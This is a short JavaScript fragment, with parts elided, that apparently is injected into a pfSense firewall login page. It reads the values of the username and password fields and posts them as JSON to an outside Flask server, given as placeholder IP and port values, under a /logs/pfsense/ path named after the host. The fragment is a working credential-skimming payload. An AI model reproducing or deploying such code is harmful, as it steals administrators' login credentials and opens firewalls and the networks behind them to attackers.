...
var path = host.replace('.','DOT').replace('.','DOT').replace('.','DOT').replace('.','DOT');

var xhr = new XMLHttpRequest();
if (document.URL.includes('ttps:')) {
var url = "https://FLASK_IP:FLASK_HTTPS_PORT/logs/pfsense/"+path;
} else {
var url = "http://FLASK_IP:FLASK_HTTP_PORT/logs/pfsense/"+path;
}
...
var data = JSON.stringify({"username": document.forms[0].elements.usernamefld.value, "password": document.forms[0].elements.passwordfld.value});
xhr.send(data);
